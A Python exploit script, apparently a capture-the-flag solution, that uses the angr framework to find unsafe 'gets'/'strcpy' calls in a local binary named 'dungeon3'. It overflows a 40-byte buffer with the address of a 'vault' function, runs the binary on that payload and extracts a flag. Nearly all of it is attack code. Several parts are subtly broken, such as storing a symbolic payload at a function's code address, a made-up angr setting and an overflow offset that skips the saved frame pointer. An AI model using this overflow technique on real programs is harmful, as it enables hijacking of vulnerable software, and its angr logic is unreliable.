import angr
import subprocess
import re
import logging

def find_vulnerability(binary_path):
    proj = angr.Project(binary_path, auto_load_libs=False)
    cfg = proj.analyses.CFG()

    vulnerabilities = []
    for func in cfg.kb.functions.values():
        # Check if the function has potential vulnerabilities
        if "gets" in func.name or "strcpy" in func.name:
            vulnerabilities.append(func.addr)

    return vulnerabilities

def exploit_vulnerability(binary_path, vulnerability_addr, payload_file):
    try:
        # Execute the binary with the payload file as input
        process = subprocess.Popen([binary_path], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate(input=open(payload_file, 'rb').read())

        # Decode the output for further processing
        output = stdout.decode().strip()
        error_output = stderr.decode().strip()

        # Print the output for debugging
        print("Output:", output)
        print("Error Output:", error_output)

        # Search for the flag pattern in the output
        flag_pattern = r"Guard: The flag is (.+)"
        match = re.search(flag_pattern, output)
        if match:
            flag = match.group(1)
            print("Flag found:", flag)
        else:
            # Search again in the error output
            match = re.search(flag_pattern, error_output)
            if match:
                flag = match.group(1)
                print("Flag found:", flag)
    except FileNotFoundError:
        print("Error: Binary or payload file not found.")
    except subprocess.CalledProcessError as e:
        print(f"Error executing binary: {e}")

def exploit_binary(binary_path, payload_file):
    vulnerabilities = find_vulnerability(binary_path)
    if not vulnerabilities:
        print("No vulnerabilities found.")
        return

    for vulnerability_addr in vulnerabilities:
        proj = angr.Project(binary_path, auto_load_libs=False)
        state = proj.factory.entry_state()

        # Generate a symbolic payload
        payload = state.solver.BVS("payload", 8 * 40)

        # Constrain the payload to avoid certain characters or conditions
        state.solver.add(payload.get_byte(0) != ord('A'))

        # Set the payload at the desired buffer offset
        state.memory.store(vulnerability_addr, payload)

        # Explore the program execution
        sm = proj.factory.simulation_manager(state)
        sm.explore(find=vulnerability_addr)

        # Check if a vulnerability was triggered
        if sm.found:
            for found in sm.found:
                if found.addr == vulnerability_addr:
                    print("Vulnerability found!")
                    exploit_vulnerability(binary_path, vulnerability_addr, payload_file)

                    # Print the final state for debugging
                    print("\nFinal State:")
                    print(found)

                    return

    print("No vulnerability triggered.")

def find_vault_address(binary_path):
    proj = angr.Project(binary_path, auto_load_libs=False)
    cfg = proj.analyses.CFG()

    vault_addr = None
    for func in cfg.kb.functions.values():
        if func.name == "vault":
            vault_addr = func.addr
            break

    return vault_addr

def exploit_dungeon3(buffer_size):
    binary_path = './dungeon3'
    proj = angr.Project(binary_path, auto_load_libs=False)

    # Adjust SimStateLibc.max_gets_size to mimic overflowing read
    proj.simos.syscall_max_size = {
        'gets': buffer_size
    }

    vault_addr = find_vault_address(binary_path)
    if not vault_addr:
        print("Vault address not found.")
        return

    buffer_overflow_input = b'A' * buffer_size + vault_addr.to_bytes(8, 'little')

    with open('payload.txt', 'wb') as f:
        f.write(buffer_overflow_input)

    print("Generated payload.")

    try:
        subprocess.run(["./dungeon3"], stdin=open("payload.txt", "rb"), check=True)
    except FileNotFoundError:
        print("Error: dungeon3 binary not found.")
    except subprocess.CalledProcessError as e:
        print(f"Error executing dungeon3: {e}")

def main():
    # Set logging level to show warnings
    logging.getLogger('angr').setLevel(logging.WARNING)

    buffer_size = 40

    binary_path = "./dungeon3"
    payload_file = "payload.txt"

    exploit_binary(binary_path, payload_file)
    exploit_dungeon3(buffer_size)

if __name__ == "__main__":
    main()
    
